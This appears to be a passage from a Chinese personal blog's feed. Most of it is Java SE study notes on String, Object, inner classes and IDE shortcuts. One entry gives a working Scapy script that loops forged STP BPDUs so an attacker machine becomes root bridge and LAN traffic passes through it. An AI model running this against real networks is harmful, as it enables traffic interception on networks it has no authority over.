此命令只获取数值部分，所以留下了/r/n，然后nextLine见到上面这个/r/n就直接结束了。</p></blockquote><ul><li>解决方法：录入所有数据都用nextLine，然后通过数据转换来实现。</li></ul><h1 id="String的构造方法"><a href="#String的构造方法" class="headerlink" title="String的构造方法"></a>String的构造方法</h1><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> str = <span class="keyword">new</span> <span class="keyword">String</span>(Byte[] b);</span><br><span class="line"><span class="comment">//有参构造</span></span><br></pre></td></tr></table></figure><blockquote><p>可以按照平台的默认字符集（也就是码表，GBK等等）<code>解码byte</code>数组，而gbk等码表都涵盖了ascii码表，而码表中98、99等代码都代表着ab等，所以解码后看到的和解码前的数据不一样。</p></blockquote><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">String</span> str = <span class="keyword">new</span> <span class="keyword">String</span>(Byte[] b,<span class="number">2</span>,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//表示从b数组中的第二个索引开始解码，总共解码4个数据</span></span><br></pre></td></tr></table></figure><h1 id="String类的判断功能"><a href="#String类的判断功能" class="headerlink" title="String类的判断功能"></a>String类的判断功能</h1><ul><li>.equals()<blockquote><p>比较字符串内容序列是否相同，区分大小写</p></blockquote></li><li>.equalsIgnoreCase()<blockquote><p>与上面不同的是：不区分大小写</p></blockquote></li><li>.contains()<blockquote><p>判断字符串中是否包含传入的字符串</p></blockquote></li><li>.startsWith()<blockquote><p>判断字符串是否以传入字符串开头</p></blockquote></li><li>.endswith()<blockquote><p>判断字符串是否以传入字符串结尾</p></blockquote></li><li>.isEmpty()    <blockquote><p>判断字符串是否为空</p></blockquote></li></ul><h1 id="Null与””的区别"><a href="#Null与””的区别" class="headerlink" title="Null与””的区别"></a>Null与””的区别</h1><blockquote><p>“”是<code>字符串常量</code>，也是String类的对象，所以可以调用String类的方法</p><p>Null是<code>空常量</code>，不能调用任何方法，否则会出现空指针异常，Null可以给<code>任意引用数据类型</code>赋值。</p></blockquote><ul><li>注意事项：<blockquote><p>1、以后比较字符串时最好<code>都用equals</code>，因为equals比较的是内容，而==号比较的时后，有时比较的是<code>地址值</code></p><p>2、使用equals时，有常量就用常量对象的equals方法，<code>尽量不用变量对象的equals方法</code>，因为变量对象的值有<code>可能时null</code>，调用<code>equals方法会出现空指针异常</code></p></blockquote></li></ul><h1 id="String类的获取功能"><a href="#String类的获取功能" class="headerlink" title="String类的获取功能"></a>String类的获取功能</h1><ul><li>.length()<blockquote><p>获取字符串长度(字符个数)    </p><p>例子：<code>&quot;我&quot;.length()</code> 为1</p><p>ps：数组中的length是<code>属性</code>，而String中的是对象<code>方法</code></p></blockquote></li><li>.charAt()<blockquote><p>获取指定索引的字符</p></blockquote></li><li>.indexOf()    <blockquote><p>返回字符 或 字符串在此字符串中<code>第一次出现的索引</code></p><p>如果不存在返回-1</p><p>如果查找的是字符串，返回索引就是查找字符串<code>第一个字符的索引</code></p></blockquote></li><li>.indexOf(,)<blockquote><p>与上面不同的是在某个位置之后查找</p></blockquote></li><li>.lastIndexOf()    <blockquote><p>从后向前找</p></blockquote></li><li>.substring()<blockquote><p>从指定位置开始<code>截取字符串</code>，默认到末尾</p></blockquote></li><li>.substring(,)<blockquote><p>与上不同的是自己<code>指定了截取字符串的尾部位置</code>并且，<code>包含头不包含尾部</code></p><p>注意：截取字符串之后需要用一个变量来保存，因为substring是<code>不会改变原来的值</code>的。</p></blockquote></li></ul><h1 id="GBK码表的特性"><a href="#GBK码表的特性" class="headerlink" title="GBK码表的特性"></a>GBK码表的特性</h1><blockquote><p>1、中文是<code>两个字节</code>组成</p><p>2、中文字节的<code>第一个字节一定是负数</code></p></blockquote><h1 id="String类的类型转换功能"><a href="#String类的类型转换功能" class="headerlink" title="String类的类型转换功能"></a>String类的<code>类型转换</code>功能</h1><ul><li>.getBytes()<blockquote><p>把<code>字符串转换成字节数组</code>，这是一个编码的过程：<code>把我们看的懂的编码成计算机看得懂的</code></p></blockquote></li><li>.toCharArray()<blockquote><p>转换成字符数组</p></blockquote></li><li>String.valueOf（）<blockquote><p>把字符数组转换为字符串，传入一个字符数组，返回一个字符串</p><p>注意：    </p><p>1、传入的数组类型可以是<code>任意类型</code>，并且底层还是由String的<code>构造方法</code>来解码的。</p><p>2、此方法可以传入任意object对象，如果传入的是一个对象，那么默认调用对象的toString方法</p></blockquote></li><li>.toLowerCase()<blockquote><p>把字符串转换为小写</p></blockquote></li><li>.toUpperase()<blockquote><p>把字符串转换为大写</p></blockquote></li></ul><p>ps：String中字符的转换都是按照unicode码表来转换的</p><h1 id="String的其他功能"><a href="#String的其他功能" class="headerlink" title="String的其他功能"></a>String的其他功能</h1><ul><li>.repleace(被替换的字符串，要替换成的字符串)<blockquote><p>字符或字符串替换，不存在则不改变</p></blockquote></li><li>.trim()<blockquote><p>去除首尾空格</p></blockquote></li><li>.compareTo()<blockquote><p>按照字典顺序比较两个字符串</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;String类的概述&quot;&gt;&lt;a href=&quot;#String类的概述&quot; class=&quot;headerlink&quot; title=&quot;String类的概述&quot;&gt;&lt;/a&gt;String类的概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;它的实例用来存储字符串，在平时的使用中我们会经常用到，通常初学者会以为它是一个&lt;code&gt;基本数据类型&lt;/code&gt;，但其实它是一个&lt;code&gt;引用数据类型&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="String类" scheme="http://liuhaoan.github.io/tags/String%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Object类</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Object%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Object类/</id>
    <published>2019-04-09T07:19:43.000Z</published>
    <updated>2019-04-09T07:40:26.878Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Object类中的常用方法"><a href="#Object类中的常用方法" class="headerlink" title="Object类中的常用方法"></a>Object类中的常用方法</h1><ul><li>类名.getClass()<blockquote><p>获取这个类对象的字节码</p></blockquote></li><li><p>字节码名.getName()</p><blockquote><p>获取类的名称</p></blockquote></li><li><p>.equals(对象)</p><blockquote><p>判断<code>调用此方法的对象</code>和<code>传入对象</code>的值是否一样</p></blockquote></li></ul><ul><li>toString方法<blockquote><p>这是object里的方法，默认打印有@的内容(<code>其实是这个对象在堆内存中的地址值</code>)，因为<code>所有类都是默认继承Object类的</code>，所以重写它可以更好的显示属性值。</p><p>注：直接打印输出某个对象的引用那么<code>系统默认</code>会直接调用<code>该对象</code>的toString显示属性值，如果该类<code>没有重写</code>toString方法，默认打印该类在<code>堆内存中的地址值</code>。</p></blockquote></li></ul><a id="more"></a><h1 id="重写toString代码示例："><a href="#重写toString代码示例：" class="headerlink" title="重写toString代码示例："></a>重写toString代码示例：</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Stirng <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> name + <span class="string">","</span> + age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="equals方法"><a href="#equals方法" class="headerlink" title="equals方法"></a>equals方法</h1><ul><li>equals方法默认是比较<code>地址值</code>，然而每个对象的地址值肯定是不一样的，所以如果调用equals方法的对象<code>没有重写equals</code>，那么调用它是无意义的。</li></ul><h1 id="重写equals代码演示："><a href="#重写equals代码演示：" class="headerlink" title="重写equals代码演示："></a>重写equals代码演示：</h1><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重写equals方法</span></span><br><span class="line"><span class="keyword">public</span> boolean equals(Object obj) &#123;</span><br><span class="line">Student  s = (Student)obj;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.name.equals(s.name) &amp;&amp;<span class="keyword">this</span>.age == s.age;<span class="comment">//这里的equals调用的是string里的方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>==号和equsls的区别（面试可能问道）：<br>    1、==号可以比较基本数据类型，也可以比较应用数据类型，比较基本数据类向的值时比较的是</p><p>数据值，比较引用数据类型比较的是地址的值<br>    2、equals只能比较引用数据类型，即比较地址的值，基层还是依赖==号，默认的equal方法没</p><p>有意义，但是我们可以重写它使其有意义。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Object类中的常用方法&quot;&gt;&lt;a href=&quot;#Object类中的常用方法&quot; class=&quot;headerlink&quot; title=&quot;Object类中的常用方法&quot;&gt;&lt;/a&gt;Object类中的常用方法&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;类名.getClass()&lt;blockquote&gt;
&lt;p&gt;获取这个类对象的字节码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;字节码名.getName()&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;获取类的名称&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;.equals(对象)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;判断&lt;code&gt;调用此方法的对象&lt;/code&gt;和&lt;code&gt;传入对象&lt;/code&gt;的值是否一样&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;toString方法&lt;blockquote&gt;
&lt;p&gt;这是object里的方法，默认打印有@的内容(&lt;code&gt;其实是这个对象在堆内存中的地址值&lt;/code&gt;)，因为&lt;code&gt;所有类都是默认继承Object类的&lt;/code&gt;，所以重写它可以更好的显示属性值。&lt;/p&gt;
&lt;p&gt;注：直接打印输出某个对象的引用那么&lt;code&gt;系统默认&lt;/code&gt;会直接调用&lt;code&gt;该对象&lt;/code&gt;的toString显示属性值，如果该类&lt;code&gt;没有重写&lt;/code&gt;toString方法，默认打印该类在&lt;code&gt;堆内存中的地址值&lt;/code&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="Object类" scheme="http://liuhaoan.github.io/tags/Object%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Idea常用快捷键</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Idea常用快捷键/</id>
    <published>2019-04-09T07:14:05.000Z</published>
    <updated>2019-04-09T07:19:06.850Z</updated>
    
    <content type="html"><![CDATA[<p>暂时就这些吧</p><ul><li><p>alt+enter</p><blockquote><p>导入包，代码自动修正</p></blockquote></li><li><p>alt + /</p><blockquote><p>代码提示</p></blockquote></li></ul><a id="more"></a><ul><li>ctrl+Y    <blockquote><p>删除光标所在行</p></blockquote></li></ul><ul><li>ctrl+D    <blockquote><p>复制光标所在行，并且粘贴在它的下面</p></blockquote></li></ul><ul><li>ctrl+alt+L    <blockquote><p>格式化代码</p></blockquote></li></ul><ul><li>ctrl+/    <blockquote><p>单行注释</p></blockquote></li></ul><ul><li>Ctrl+shift+/<blockquote><p>选中行注释，多行注释</p></blockquote></li></ul><ul><li>alt+ins<blockquote><p>自动生成代码，get、set等</p></blockquote></li></ul><ul><li>alt+shift+上下箭<blockquote><p>移动当前代码行</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;暂时就这些吧&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;alt+enter&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;导入包，代码自动修正&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;alt + /&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;代码提示&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="idea快捷键" scheme="http://liuhaoan.github.io/tags/idea%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——Eclipse常用快捷键</title>
    <link href="http://liuhaoan.github.io/2019/04/09/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Eclipse%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    <id>http://liuhaoan.github.io/2019/04/09/javaSE复习之——Eclipse常用快捷键/</id>
    <published>2019-04-09T07:00:39.000Z</published>
    <updated>2019-04-09T07:31:25.025Z</updated>
    
    <content type="html"><![CDATA[<p>常用的应该就这些了</p><p>Alt + / 起到提示的作用，功能很强大，忘记代码可以用。 </p><p>ctrl + n 新建<br><a id="more"></a><br>ctrl + shift + f 格式化代码，使代码更简洁 </p><p>ctrl + / 注释 也可以ctrl + shift + /或\ </p><p>F3或ctrl + 鼠标点击 查看源码 </p><p>ctrl + 1 给建议 </p><p>alt + shift + m 抽取一段代码成方法，省去了复制 </p><p>alt + shift + r 改名，在改变量是非常好用</p><p>shift + alt + s 生成toString</p><p>Alt+Shift+C 修改函数结构(比较实用,有N个函数调用了这个方法,修改一次搞定)</p><p>Ctrl+D: 删除当前行  </p><p>Ctrl+Alt+↓ 复制当前行到下一行(复制增加) </p><p>Ctrl+Alt+↑ 复制当前行到上一行(复制增加) </p><p>Alt+↓ 当前行和下面一行交互位置(特别实用,可以省去先剪切,再粘贴了) </p><p>Alt+↑ 当前行和上面一行交互位置(同上)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;常用的应该就这些了&lt;/p&gt;
&lt;p&gt;Alt + / 起到提示的作用，功能很强大，忘记代码可以用。 &lt;/p&gt;
&lt;p&gt;ctrl + n 新建&lt;br&gt;
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="Eclipse快捷键" scheme="http://liuhaoan.github.io/tags/Eclipse%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    
  </entry>
  
  <entry>
    <title>网络攻防之——Python实现生成树协议(STP)欺骗攻击</title>
    <link href="http://liuhaoan.github.io/2019/04/09/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/09/网络攻防之——Python实现生成树协议欺骗攻击/</id>
    <published>2019-04-09T02:09:48.000Z</published>
    <updated>2019-04-09T06:54:07.448Z</updated>
    
    <content type="html"><![CDATA[<h1 id="何为生成树协议欺骗攻击？"><a href="#何为生成树协议欺骗攻击？" class="headerlink" title="何为生成树协议欺骗攻击？"></a>何为生成树协议欺骗攻击？</h1><ul><li>所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系<blockquote><p>我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。</p></blockquote></li></ul><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><a id="more"></a><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line"><span class="section">//01:80:c2:00:00:00这个是一个组播地址</span></span><br><span class="line"></span><br><span class="line">eth = Dot3(dst=<span class="string">"01:80:c2:00:00:00"</span>, src=<span class="string">"自己的MAC地址"</span>)</span><br><span class="line"></span><br><span class="line">llc = LLC()</span><br><span class="line"></span><br><span class="line">stp = STP(rootid=0, rootmac=<span class="string">"自己的MAC地址"</span>, bridgeid=0, bridgemac=<span class="string">"自己的MAC地址"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">pkt=sendp(eth/llc/stp,inter=2,loop=1)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;何为生成树协议欺骗攻击？&quot;&gt;&lt;a href=&quot;#何为生成树协议欺骗攻击？&quot; class=&quot;headerlink&quot; title=&quot;何为生成树协议欺骗攻击？&quot;&gt;&lt;/a&gt;何为生成树协议欺骗攻击？&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系&lt;blockquote&gt;
&lt;p&gt;我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;代码示例&quot;&gt;&lt;a href=&quot;#代码示例&quot; class=&quot;headerlink&quot; title=&quot;代码示例&quot;&gt;&lt;/a&gt;代码示例&lt;/h1&gt;
    
    </summary>
    
      <category term="网络攻防" scheme="http://liuhaoan.github.io/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="Python" scheme="http://liuhaoan.github.io/tags/Python/"/>
    
      <category term="网络攻防" scheme="http://liuhaoan.github.io/tags/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/"/>
    
      <category term="生成树协议欺骗" scheme="http://liuhaoan.github.io/tags/%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE%E6%AC%BA%E9%AA%97/"/>
    
  </entry>
  
  <entry>
    <title>javaSE复习之——面向对象_内部类</title>
    <link href="http://liuhaoan.github.io/2019/04/08/javaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%86%85%E9%83%A8%E7%B1%BB/"/>
    <id>http://liuhaoan.github.io/2019/04/08/javaSE复习之——面向对象-内部类/</id>
    <published>2019-04-08T05:22:50.000Z</published>
    <updated>2019-04-08T11:51:45.602Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内部类的概述"><a href="#内部类的概述" class="headerlink" title="内部类的概述"></a>内部类的概述</h1><ul><li>内部类就是在一个类中定义的另一个类。<ul><li>ps：刚开始学java对于内部类用到的着实不多，但随着编程能力的提高，我们会领悟到它魅力的所在</li></ul></li></ul><a id="more"></a><h1 id="内部类的分类"><a href="#内部类的分类" class="headerlink" title="内部类的分类"></a>内部类的分类</h1><h4 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a><code>成员</code>内部类</h4><blockquote><p>它定义在一个<code>类</code>的内部</p></blockquote><h4 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a><code>局部</code>内部类</h4><blockquote><p>它定义在一个<code>方法</code>或者<code>一个作用域</code>内部，它的<code>访问仅限于</code>方法内或者该作用域内</p><p>注意事项：</p><p>局部内部类就像是方法里面的一个局部变量一样，是不能有public、protected、private以及static修饰符的</p></blockquote><h4 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a><code>匿名</code>内部类</h4><blockquote><p>匿名内部类应该是平时我们编写代码时<code>用得最多的</code>，在编写<code>事件监听</code>的代码时使用匿名内部类不但方便，而且使代码更加<code>容易维护</code></p><p>例如：为按钮设置一个监听器<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">         </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">             </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h4 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a><code>静态</code>内部类</h4><blockquote><p>它是定义在另一个类里面的类，只不过在类的前面多了一个关键字static</p></blockquote><h1 id="内部类的面试题之-——-内部类能不能访问外部类成员变量？"><a href="#内部类的面试题之-——-内部类能不能访问外部类成员变量？" class="headerlink" title="内部类的面试题之 —— 内部类能不能访问外部类成员变量？"></a>内部类的面试题之 —— <code>内部类</code>能不能访问<code>外部类</code>成员变量？</h1><ul><li><p>答（成员内部类）：</p><blockquote><p><code>内部类</code>可以访问<code>外部类</code>的成员变量，因为编译器底层在创建<code>成员内部类</code>时，为成员内部类加上了指向外部类的引用</p><p>示例：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外部类.<span class="keyword">this</span>.成员变量</span><br><span class="line">外部类.<span class="keyword">this</span>.成员方法</span><br></pre></td></tr></table></figure></blockquote></li><li><p>ps：虽然内部类访问外部类可以随心所欲，但是外部类想要访问内部类就需要创建内部类实例然后利用对它的引用进行访问了</p></li><li>例子：</li></ul><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Circle</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> radius = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Circle</span>(<span class="params"><span class="keyword">double</span> radius</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.radius = radius;</span><br><span class="line">        getDrawInstance().drawSahpe();</span><br><span class="line"><span class="comment">//必须先创建成员内部类的对象，再进行访问</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">private</span> Draw <span class="title">getDrawInstance</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Draw();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">class</span> <span class="title">Draw</span> &#123;     <span class="comment">//内部类</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">drawSahpe</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            System.<span class="keyword">out</span>.println(radius);</span><br><span class="line"><span class="comment">//外部类的private成员</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="匿名内部类访问外部类成员底层实现原理："><a href="#匿名内部类访问外部类成员底层实现原理：" class="headerlink" title="匿名内部类访问外部类成员底层实现原理："></a><code>匿名内部类</code>访问外部类成员底层实现原理：</h1><blockquote><p>我们用一段代码来举例：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Test</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String[] args</span>)</span>  &#123;</span><br><span class="line">         </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        final <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">new</span> Thread()&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">                System.<span class="keyword">out</span>.println(a);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>当test方法调用，系统会给内部类自动加上构造器<code>（这也就是为什么匿名内部类不能有构造方法的原因）</code>，这个构造器含有两个参数，一个指向外部类对象的引用，一个是int类型变量，这个int类型变量就是外部类中那个int变量的拷贝，它的值也就是10，同理如果是一个引用数据类型的话，那就是一个在堆内存中的地址值。<code>这样就解决了生命周期的问题</code></p><p><code>但是还有一个数据不一致的问题</code>，如果内部类或者外部类修改了这个变量的值，那么对方是不可能知道的，所以造成了数据不一致的问题。</p><p>数据不一致问题的<code>解决方法</code>就是直接给变量修饰一个final，这就是为什么匿名内部类访问外部类中的变量时，这个变量一定要final修饰的原因</p></blockquote><ul><li>在jdk8之前，局部内部类访问外部类成员变量，那么外部类的那个变量就需要用<code>final</code>修饰</li><li>jdk8新特性<blockquote><p>局部内部类与匿名内部类访问外部类成员变量，外部类那个变量<code>不需要</code>final修饰了，但其实只是个“语法糖”，只要有对这个成员变量修改的操作，还是会强制要求final修饰的。</p></blockquote></li></ul><h1 id="匿名内部类-1"><a href="#匿名内部类-1" class="headerlink" title="匿名内部类"></a>匿名内部类</h1><ul><li>格式：</li></ul><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果是类那么就代表继承这个类，是抽象类那么就是实现这个抽象方法</span></span><br><span class="line"><span class="keyword">new</span> <span class="type"></span>类名或者抽象类名() &#123;</span><br><span class="line"></span><br><span class="line">&#125;.方法名（）</span><br><span class="line"><span class="comment">//.方法名()可有无，只是加上可以直接调用匿名内部类中的方法</span></span><br></pre></td></tr></table></figure><ul><li><p>解释：</p><blockquote><p>可以吧<code>new 到  }</code> 的代码看作创建的一个子类对象实例，所以后面可以<code>.方法名</code>调用</p></blockquote></li><li><p>好处：</p><blockquote><p>可以不用声明一个类了，而且把代码都集成到了一起，可以使代码更加简洁。</p></blockquote></li><li><p>注意事项：</p><blockquote><p>1、<code>匿名内部类</code>只针对重写<code>一个方法</code>使用，如果要一次性重写<code>多个方法</code>的话不使用，因为调用一次就要创建一次对象，这样就没必要使用匿名内部类了，如果要多次使用则<code>重新定义类</code>。</p><p>2、匿名内部类可以当作参数传递，本质是把匿名内部类看作一个子类对象。</p><p>3、匿名内部类中不能定义构造函数。</p><p>4、使用匿名内部类时，我们必须是<code>继承一个类</code>或者<code>实现一个接口</code>，但是两者不可兼得，只能继承一个类或者实现一个接口。</p><p>5、匿名内部类中不能存在任何的静态成员变量和静态方法。</p><p>6、匿名内部类<code>属于</code>局部内部类，所以局部内部类<code>所有限制</code>都在匿名内部类上生效</p><p>7、匿名内部类不能是抽象的，它<code>必须实现</code>继承的类或者接口中的抽象方法</p></blockquote></li></ul><h1 id="链式编程："><a href="#链式编程：" class="headerlink" title="链式编程："></a>链式编程：</h1><ul><li>特点：<blockquote><p>调用方法后还能调用方法，也就是说调用第一个方法之后返回的是一个对象。</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;内部类的概述&quot;&gt;&lt;a href=&quot;#内部类的概述&quot; class=&quot;headerlink&quot; title=&quot;内部类的概述&quot;&gt;&lt;/a&gt;内部类的概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;内部类就是在一个类中定义的另一个类。&lt;ul&gt;
&lt;li&gt;ps：刚开始学java对于内部类用到的着实不多，但随着编程能力的提高，我们会领悟到它魅力的所在&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
